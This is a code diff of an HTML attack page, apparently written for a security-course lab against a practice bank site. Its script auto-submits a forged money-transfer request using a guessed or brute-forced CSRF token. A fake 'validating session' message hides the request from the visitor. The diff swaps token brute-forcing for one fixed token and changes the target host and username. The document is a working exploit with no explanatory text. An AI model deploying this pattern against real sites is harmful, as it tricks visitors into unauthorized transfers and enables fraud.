@@ -7,28 +7,25 @@
 <body>
     <script>
         async function exploit() {
-            const target = "https://engineering.quoccabank.com/api/transfer";
+            const target = "https://phish-me.quoccacorp.com/api/transfer";
 
-            for (let i = 1; i < 9999; i++) {
-                let token = btoa(i.toString());
+            let token = btoa(8624);
 
-                let body = new URLSearchParams();
-                body.append('csrf_token', token);
-                body.append('username', 'z5631971');
-                body.append('amount', '1');
+            let body = new URLSearchParams();
+            body.append('csrf_token', token);
+            body.append('username', 'z5631970');
+            body.append('amount', '1');
 
-                fetch(target, {
-                    method: 'POST',
-                    body: body,
-                    mode: 'no-cors',
-                    headers: {
-                        'Content-Type': 'application/x-www-form-urlencoded'
-                    }
-                });
-            }
-
+            return await fetch(target, {
+                method: 'POST',
+                body: body,
+                mode: 'no-cors',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                }
+            });
         }
-        exploit();
+        exploit().then((resp) => { console.log(resp) }).catch((err) => { console.log(err) });
     </script>
     <h1>Please wait, validating session...</h1>
 </body>
